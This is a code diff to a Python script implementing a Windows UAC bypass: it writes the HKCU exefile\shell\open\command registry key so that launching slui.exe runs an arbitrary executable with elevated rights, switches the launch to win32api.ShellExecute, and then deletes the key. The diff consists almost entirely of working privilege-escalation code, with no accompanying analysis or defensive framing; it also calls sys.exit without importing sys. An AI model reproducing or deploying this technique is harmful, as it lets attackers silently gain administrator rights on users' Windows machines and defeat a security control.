@@ -9,6 +9,8 @@ executable file can be provided.
 
 import os
 import _winreg
+import win32api
+import win32con
 
 def slui_file_hijack(executable_path):
 	registry_path = r"Software\Classes\exefile\shell\open\command"
@@ -24,11 +26,10 @@ def slui_file_hijack(executable_path):
 		_winreg.CloseKey(key)
 		return True
 	try:
-		os.popen("slui.exe")
-		return True
-	except Exception as e:
-		return False
+		win32api.ShellExecute(0,None,"c:\windows\system32\slui.exe", None, None, win32con.SW_SHOW)
+	except Exception as error:
+		sys.exit()
 	try:
-		_winreg.DeleteKey("Software\Classes\exefile\shell\open\command")
-	except Exception as e:
-		return False
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Classes\exefile\shell\open\command")
+	except Exception as error:
+		return False	
